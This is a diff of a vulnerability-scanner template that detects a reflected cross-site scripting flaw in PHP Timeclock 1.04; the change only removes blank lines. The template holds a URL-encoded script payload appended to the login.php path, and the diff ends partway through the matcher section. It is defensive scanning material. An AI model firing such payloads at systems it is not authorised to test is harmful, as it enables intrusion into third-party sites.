@@ -1,5 +1,4 @@
 id: php-timeclock-xss
-
 info:
   name: PHP Timeclock 1.04 XSS
   author: geeknik
@@ -7,12 +6,10 @@ info:
   reference: https://www.exploit-db.com/exploits/49853
   severity: medium
   tags: timeclock,xss
-
 requests:
   - method: GET
     path:
       - "{{BaseURL}}/login.php/'%3E%3Csvg/onload=confirm%60xss%60%3E"
-
     matchers-condition: and
     matchers:
       - type: word
